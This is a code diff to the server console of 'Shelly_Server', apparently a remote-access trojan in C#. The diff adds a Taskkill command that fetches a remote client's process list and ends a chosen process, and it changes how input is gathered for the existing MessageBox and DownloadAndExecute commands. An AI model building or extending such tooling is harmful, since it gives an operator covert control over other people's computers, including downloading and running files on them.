@@ -28,7 +28,8 @@ namespace Shelly_Server
                         "4. MessageBox - Shows a messagebox on the clients computer\n" +
                         "5. DownloadAndExecute - Downloads and executes a file\n" +
                         "6. OpenWebsite - Opens a website using the IE browser\n" +
-                        "7. Info - Shows client system information\n\n" +
+                        "7. Info - Shows client system information\n" +
+                        "8. Taskkill - Terminate process on client computer\n\n" +
 
                         "FUN\n" +
                         "1. ChangeWallpaper - Changes client desktop wallpaper\n" +
@@ -71,14 +72,14 @@ namespace Shelly_Server
                 case "messagebox":
 
                     // Send message
-                    SocketHandler.Send(CommandPS + Functions.UserInput.GetMessageBoxInput());
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetGeneralInput(3));
                     break;
 
                 // Download and execute
                 case "downloadandexecute":
 
                     // Send message
-                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1) + " " + Functions.UserInput.GetExtentionInput());
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1) + " " + Functions.UserInput.GetGeneralInput(1));
                     break;
 
                 // Open website
@@ -96,6 +97,19 @@ namespace Shelly_Server
 
                     // Get response
                     Console.WriteLine(SocketHandler.Receive());
+                    break;
+
+                // Taskkill
+                case "taskkill":
+
+                    // Send message
+                    SocketHandler.Send(Command);
+
+                    // Get and show all running processes
+                    Console.WriteLine(SocketHandler.Receive());
+
+                    // Send message
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetGeneralInput(2));
                     break;
 
                 // Change wallpaper
